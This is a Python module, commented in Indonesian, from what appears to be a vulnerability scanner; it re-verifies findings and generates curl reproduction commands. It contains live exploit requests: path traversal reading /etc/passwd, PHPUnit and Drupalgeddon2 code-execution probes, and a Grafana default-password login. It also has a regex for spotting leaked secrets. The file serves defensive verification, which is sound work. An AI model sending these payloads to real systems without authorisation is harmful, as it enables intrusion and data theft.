"""Active curl-equivalent verification scanner.

Modul ini BUKAN scanner pencari celah baru — ia adalah POST-PROCESSOR yang
mengambil finding dari modul lain dan melakukan RE-VALIDASI aktif dengan
request curl-equivalent yang presisi.

v0.10.3 STRICT: fallback verifier sekarang TIDAK menerima "status<400" saja
sebagai bukti. Verifikasi fallback membandingkan response body & status
target dengan negative-control (path random di origin yang sama). Hanya
kalau ada perbedaan SIGNIFIKAN + sinyal kuat dari evidence asli, finding
ditandai `curl_verified=True`. Selebihnya `False` dengan note manual.

Tujuan:
1. Konfirmasi ulang bahwa celah benar-benar terbuka SAAT INI (bukan cached).
2. Menghasilkan perintah curl SIAP COPY-PASTE.
3. Menambahkan field `curl_verify_cmd` ke Finding.extra.
"""
from __future__ import annotations

import re
import secrets
from urllib.parse import urlparse, urljoin

from cyberloka.core import (
    Finding,
    HttpClient,
    Severity,
    Target,
    is_catch_all_response,
    is_soft_200,
)
from cyberloka.core.config import ScanConfig

# Mapping module -> resep verifikasi presisi.
VERIFY_RECIPES: dict[str, dict] = {
    "apache_path_confusion": {
        "method": "GET",
        "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "signature": "root:x:0:0:",
        "comment": "# CVE-2021-41773: path traversal via encoded dots",
    },
    "phpunit_rce": {
        "method": "POST",
        "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "body": "<?php echo md5(31337); ?>",
        "content_type": "text/plain",
        "signature": "0d59b5dee72c0a82b22b85ab1bb59a3a",
        "comment": "# CVE-2017-9841: PHPUnit eval-stdin RCE",
    },
    "docker_remote_api": {
        "method": "GET",
        "path": "/version",
        "signature": '"ApiVersion"',
        "comment": "# Docker Remote API tanpa auth",
    },
    "elasticsearch_unauth": {
        "method": "GET",
        "path": "/_cluster/health",
        "signature": "cluster_name",
        "comment": "# Elasticsearch tanpa autentikasi",
    },
    "spring_actuator_rce": {
        "method": "GET",
        "path": "/actuator/env",
        "signature": "propertySources",
        "comment": "# Spring Boot Actuator exposed",
    },
    "jenkins_unauth_console": {
        "method": "GET",
        "path": "/script",
        "signature": "Groovy script",
        "comment": "# Jenkins Script Console tanpa auth",
    },
    "solr_admin_unauth": {
        "method": "GET",
        "path": "/solr/admin/cores?action=STATUS&wt=json",
        "signature": "responseHeader",
        "comment": "# Apache Solr admin tanpa auth",
    },
    "nginx_off_by_slash": {
        "method": "GET",
        "path": "/static../etc/passwd",
        "signature": "root:x:0:0:",
        "comment": "# Nginx alias off-by-slash traversal",
    },
    "grafana_default_login": {
        "method": "POST",
        "path": "/login",
        "body": '{"user":"admin","password":"admin"}',
        "content_type": "application/json",
        "signature": "grafana_session",
        "check_cookies": True,
        "comment": "# Grafana default credentials admin/admin",
    },
    "wp_xmlrpc_amplify": {
        "method": "POST",
        "path": "/xmlrpc.php",
        "body": '<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>',
        "content_type": "text/xml",
        "signature": "pingback.ping",
        "comment": "# WordPress xmlrpc.php aktif",
    },
    "firebase_open_db": {
        "method": "GET",
        "path": "/.json",
        "signature": "{",
        "comment": "# Firebase Realtime DB rules .read=true",
    },
    "adminer_exposed": {
        "method": "GET",
        "path": "/adminer.php",
        "signature": "Adminer",
        "comment": "# Adminer.php ter-expose di webroot",
    },
    "phpmyadmin_exposed": {
        "method": "GET",
        "path": "/phpmyadmin/",
        "signature": "phpMyAdmin",
        "comment": "# phpMyAdmin terbuka publik",
    },
    "gitlab_unauth_api": {
        "method": "GET",
        "path": "/api/v4/users?per_page=5",
        "signature": '"username"',
        "comment": "# GitLab API tanpa autentikasi",
    },
    "kibana_unauth": {
        "method": "GET",
        "path": "/api/status",
        "signature": "version",
        "comment": "# Kibana terbuka tanpa auth",
    },
    "prometheus_unauth": {
        "method": "GET",
        "path": "/metrics",
        "signature": "# HELP",
        "comment": "# Prometheus metrics terbuka",
    },
    "cors_null_origin": {
        "method": "GET",
        "path": "/api/me",
        "headers": {"Origin": "null"},
        "signature": "Access-Control-Allow-Origin",
        "check_headers": True,
        "comment": "# CORS null origin + credentials",
    },
    "s3_world_writable": {
        "method": "GET",
        "path": "/",
        "signature": "ListBucketResult",
        "comment": "# S3 bucket public listing",
    },
}


def _build_curl_cmd(method: str, url: str, headers: dict | None = None,
                    body: str | None = None, content_type: str | None = None,
                    comment: str = "") -> str:
    """Build a curl command string ready for copy-paste.

    Body request TIDAK ditruncate — pembaca laporan harus bisa benar-benar
    copy-paste dan menjalankan perintah persis untuk reproduksi celah.
    PDF reporter (``_wrap_for_pre``) akan men-soft-wrap baris panjang
    sehingga tidak terpotong di halaman.
    """
    parts = ["curl"]
    if method != "GET":
        parts.append(f"-X {method}")
    parts.append("-i")
    parts.append("-s")
    if headers:
        for k, v in headers.items():
            parts.append(f"-H '{k}: {v}'")
    if content_type:
        parts.append(f"-H 'Content-Type: {content_type}'")
    if body:
        # Escape single-quotes utk shell single-quoted string.
        # Body apa pun (termasuk JSON / XML / multi-line) tetap utuh.
        safe_body = body.replace("'", "'\\''")
        parts.append(f"-d '{safe_body}'")
    parts.append(f"'{url}'")
    cmd = " \\\n  ".join(parts)
    if comment:
        cmd = f"{comment}\n{cmd}"
    return cmd


def _negative_control(client: HttpClient, target: Target):
    """Fetch path random di origin yang sama untuk dipakai sebagai
    negative-control. Returns (status, length, first_bytes) atau None.
    """
    try:
        base = (getattr(target, "origin", None) or target.base_url).rstrip("/") + "/"
    except AttributeError:
        return None
    rand = f"cyberloka-control-{secrets.token_hex(6)}"
    url = urljoin(base, rand)
    r = client.get(url, allow_redirects=False)
    if r is None:
        return None
    body = r.text or ""
    return r.status_code, len(body), body[:256], body


# Pola "evidence" yang umum dipakai modul scanner kami untuk reproduce
# signature di response (biasa muncul di Finding.evidence).
_EVIDENCE_TOKENS_RE = re.compile(
    r"(root:[x*]:0:0:|"          # /etc/passwd
    r"\[fonts\]|"                 # win.ini
    r"-----BEGIN [A-Z ]*PRIVATE|"  # private key
    r"PHP Version|"               # phpinfo
    r"INSERT INTO|"               # SQL dump
    r"AKIA[A-Z0-9]{16}|"          # AWS key
    r"AWS_SECRET|"                # AWS secret
    r"DB_PASSWORD|"               # env var
    r"<title>\s*Index of\s*/|"    # dirlist
    r"phpMyAdmin|"                # phpmyadmin
    r"Adminer|"                   # adminer
    r"Set-Cookie:\s*[^=]+=[^;]+)" # cookies
    , re.I,
)


def _verify_drupalgeddon2(client: HttpClient, target: Target) -> dict:
    """Re-verify Drupalgeddon2 dengan oracle yang SAMA PERSIS dengan modul.

    Memakai `drupalgeddon2.make_oracle()` / `is_executed()` (printf `%%`→`%`),
    sehingga server yang BENAR rentan pasti lolos re-verifikasi — bukan gagal
    karena payload/signature berbeda seperti versi lama (signature statis
    `CYBLOK` yang rawan refleksi & tak konsisten dengan modul).
    """
    from cyberloka.active import drupalgeddon2 as _dgn2  # hindari siklus impor

    base = getattr(target, "origin", None) or target.base_url
    markup, executed, reflected = _dgn2.make_oracle()
    path = _dgn2.TARGET_TEMPLATES[1].format(markup=markup)  # /user/password?...
    url = base.rstrip("/") + "/" + path.lstrip("/")
    ct = "application/x-www-form-urlencoded"
    comment = "# CVE-2018-7600 Drupalgeddon2 — bukti eksekusi printf ('%%'->'%')"
    curl_cmd = _build_curl_cmd("POST", url, None, _dgn2.POST_DATA, ct, comment)

    resp = client.post(url, data=_dgn2.POST_DATA,
                       headers={"Content-Type": ct}, allow_redirects=False)
    if resp is None:
        return {"verified": False, "curl_cmd": curl_cmd, "response_status": 0,
                "response_match": False, "note": "request gagal / timeout"}
    body = resp.text or ""
    matched = _dgn2.is_executed(body, executed, reflected)
    return {
        "verified": matched and resp.status_code < 500,
        "curl_cmd": curl_cmd,
        "response_status": resp.status_code,
        "response_match": matched,
        "note": "" if matched else (
            f"printf tidak mereduksi '%%'->'%' (marker eksekusi '{executed}' tidak "
            "muncul) — eksekusi RCE TIDAK terbukti, finding tidak diverifikasi ulang"
        ),
    }


def _verify_finding(client: HttpClient, finding: Finding, target: Target,
                    ctrl: tuple[int, int, str] | None) -> dict:
    """Re-verify a finding and return curl info dict."""
    module = (finding.module or "").lower()
    if module == "drupalgeddon2":
        return _verify_drupalgeddon2(client, target)
    recipe = VERIFY_RECIPES.get(module)

    # Recipe presisi
    if recipe:
        if "://" in (recipe.get("path") or ""):
            url = recipe["path"]
        else:
            base = getattr(target, "origin", target.base_url)
            url = base.rstrip("/") + (recipe.get("path") or "")
        method = recipe.get("method", "GET")
        headers = recipe.get("headers")
        body = recipe.get("body")
        content_type = recipe.get("content_type")
        signature = recipe.get("signature", "")
        comment = recipe.get("comment", "")
        check_cookies = recipe.get("check_cookies", False)
        check_headers = recipe.get("check_headers", False)

        kwargs = {"allow_redirects": False}
        req_headers = dict(headers or {})
        if content_type:
            req_headers["Content-Type"] = content_type
        if req_headers:
            kwargs["headers"] = req_headers

        if method == "GET":
            resp = client.get(url, **kwargs)
        elif method == "POST":
            kwargs["data"] = body
            resp = client.post(url, **kwargs)
        else:
            resp = client.request(method, url, data=body, **kwargs)

        if resp is None:
            return {"verified": False, "curl_cmd": _build_curl_cmd(
                method, url, headers, body, content_type, comment
            ), "response_status": 0, "response_match": False,
                "note": "request gagal / timeout"}

        resp_body = resp.text or ""
        resp_headers_str = str(dict(resp.headers))
        if check_cookies:
            cookie_str = " ".join(c.name for c in resp.cookies) if hasattr(resp, "cookies") else ""
            matched = signature.lower() in cookie_str.lower()
        elif check_headers:
            matched = signature.lower() in resp_headers_str.lower()
        else:
            matched = signature in resp_body
            # Centralized catch-all guard: signature yang muncul di halaman
            # catch-all / SPA shell BUKAN bukti celah. Tolak bila response
            # adalah soft-200 atau identik dengan path random kontrol.
            if matched:
                ctrl_body = ctrl[3] if (ctrl and len(ctrl) > 3) else None
                if is_soft_200(resp) or is_catch_all_response(resp_body, ctrl_body):
                    matched = False
        note_fail = (
            f"signature `{signature[:30]}` muncul tetapi response = catch-all/"
            "SPA shell (sama dengan kontrol) -> bukan bukti, perlu review manual"
            if (signature in resp_body and not matched and not (check_cookies or check_headers))
            else f"signature `{signature[:30]}` tidak ditemukan"
        )
        return {
            "verified": matched and resp.status_code < 500,
            "curl_cmd": _build_curl_cmd(method, url, headers, body, content_type, comment),
            "response_status": resp.status_code,
            "response_match": matched,
            "note": "" if matched else note_fail,
        }

    # ====== FALLBACK MODE (v0.10.3 strict) ======
    url = (finding.urls[0] if finding.urls else finding.target or "")
    if not url or not url.startswith(("http://", "https://")):
        return {"verified": False,
                "curl_cmd": f"# No URL available for {module}",
                "response_status": 0,
                "response_match": False,
                "note": "URL finding tidak tersedia untuk re-verifikasi"}

    resp = client.get(url, allow_redirects=False)
    curl_cmd = _build_curl_cmd("GET", url, comment=f"# Verifikasi modul: {module}")
    if resp is None:
        return {"verified": False, "curl_cmd": curl_cmd,
                "response_status": 0, "response_match": False,
                "note": "request gagal"}

    body = resp.text or ""
    status = resp.status_code

    # Step 1: status code di range "menarik" (2xx/3xx). 4xx/5xx -> belum
    # tentu false, tapi tidak bisa kami klaim sebagai verified.
    if status >= 400:
        return {"verified": False, "curl_cmd": curl_cmd,
                "response_status": status, "response_match": False,
                "note": f"status {status} -> endpoint tidak accessible saat ini"}

    # Step 2: bandingkan dengan negative-control (path random)
    if ctrl is not None:
        ctrl_status, ctrl_len, ctrl_first = ctrl[0], ctrl[1], ctrl[2]
        if ctrl_status == status and abs(len(body) - ctrl_len) <= 32 and body[:128] == ctrl_first[:128]:
            return {"verified": False, "curl_cmd": curl_cmd,
                    "response_status": status, "response_match": False,
                    "note": ("response identik dengan path random kontrol -> "
                             "server selalu balas SPA shell / 200 catch-all -> "
                             "tidak bisa diverifikasi otomatis, perlu review manual")}

    # Step 3: cari signature kuat di body / evidence
    evidence = (finding.evidence or "")[:2048]
    evid_match = _EVIDENCE_TOKENS_RE.search(evidence)
    body_has_evid = False
    matched_token = ""
    if evid_match:
        matched_token = evid_match.group(0)
        body_has_evid = matched_token in body

    if body_has_evid:
        return {"verified": True, "curl_cmd": curl_cmd,
                "response_status": status, "response_match": True,
                "note": f"signature kanonik `{matched_token[:40]}` masih muncul di response"}

    # Step 4: cari sub-string apa pun dari evidence (pertama 80 char) di body
    evid_sub = (finding.evidence or "").strip().splitlines()[0][:80] if finding.evidence else ""
    if evid_sub and len(evid_sub) > 16 and evid_sub in body:
        return {"verified": True, "curl_cmd": curl_cmd,
                "response_status": status, "response_match": True,
                "note": f"sub-string evidence (`{evid_sub[:40]}...`) masih muncul"}

    # Tidak ada konfirmasi kuat -> tidak diverifikasi otomatis.
    return {"verified": False, "curl_cmd": curl_cmd,
            "response_status": status, "response_match": False,
            "note": ("response berbeda dari kontrol, tetapi tidak ada signature "
                     "kuat dari evidence yang konsisten -> perlu review manual")}


def run(target: Target, config: ScanConfig) -> list[Finding]:
    """Module ini tidak menghasilkan finding baru — enrichment via post_process."""
    return []


def post_process(findings: list[Finding], target: Target, config: ScanConfig) -> list[Finding]:
    """Re-verify CRITICAL/HIGH findings, attach curl + verification status.

    v0.10.3 strict: ketidakmampuan memverifikasi otomatis akan MENURUNKAN
    severity finding yang originally CRITICAL/HIGH ke MEDIUM dengan note
    bahwa perlu manual confirm. Ini melindungi pelaporan "200 + marker"
    yang sebenarnya AMAN.
    """
    client = HttpClient(config)
    try:
        ctrl = _negative_control(client, target)
        for f in findings:
            if f.severity not in (Severity.CRITICAL, Severity.HIGH):
                continue
            result = _verify_finding(client, f, target, ctrl)
            if not isinstance(f.extra, dict):
                f.extra = {}
            f.extra["curl_verify_cmd"] = result["curl_cmd"]
            f.extra["curl_verified"] = result["verified"]
            f.extra["curl_response_status"] = result["response_status"]
            note = result.get("note", "")
            if note:
                f.extra["curl_verify_note"] = note

            # Severity downgrade kalau verifikasi otomatis GAGAL
            # dan finding bukan dari kelas yang sudah confirmed.
            if not result["verified"] and f.confidence != "confirmed":
                # Hanya turunkan kalau modul TIDAK punya recipe presisi
                # (artinya, tidak ada cara kanonik untuk verifikasi).
                module = (f.module or "").lower()
                if module not in VERIFY_RECIPES and f.severity == Severity.HIGH:
                    f.severity = Severity.MEDIUM
                    f.confidence = "tentative"
                    f.extra["downgraded"] = (
                        "Severity diturunkan karena verifikasi otomatis tidak "
                        "berhasil mengkonfirmasi finding. Perlu review manual."
                    )
                elif module not in VERIFY_RECIPES and f.severity == Severity.CRITICAL:
                    f.severity = Severity.HIGH
                    f.confidence = "tentative"
                    f.extra["downgraded"] = (
                        "Severity diturunkan dari CRITICAL ke HIGH karena "
                        "verifikasi otomatis tidak berhasil. Perlu review manual."
                    )
    finally:
        client.close()
    return findings
